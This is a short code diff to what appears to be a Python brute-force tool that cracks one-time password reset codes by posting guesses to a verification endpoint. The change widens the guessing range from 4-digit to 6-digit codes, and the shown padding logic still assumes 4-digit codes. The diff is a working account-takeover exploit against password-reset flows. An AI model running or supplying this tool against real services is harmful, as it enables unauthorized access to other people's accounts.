@@ -123,7 +123,7 @@ class cb_main_process_missyou():
         payld = json.dumps(payload)
         ret = requests.post(url, headers=head, data=payld)
         data = ret.json()
-        n=9999
+        n=999999
         sys.stdout.write('\r' + 'Cracking...  Combinations ' + str(otp) + '/' + str(n) + ' ' + '{:.2f}'.format(int(otp) / n * 100) + '%')
         sys.stdout.flush()
         if ret.status_code != 200:
@@ -154,8 +154,8 @@ class cb_main_process_missyou():
             return True
     def bruteforce_missyou(main_url,verify_reset_code_path,header,payload,otp_key):
         codes = []
-        print("Generating 4 digit combinations....")
-        for i in range(0, 9999):
+        print("Generating 6 digit combinations....")
+        for i in range(0, 999999):
             if i < 10:
                 codes.append("000" + str(i))
             elif i < 100:
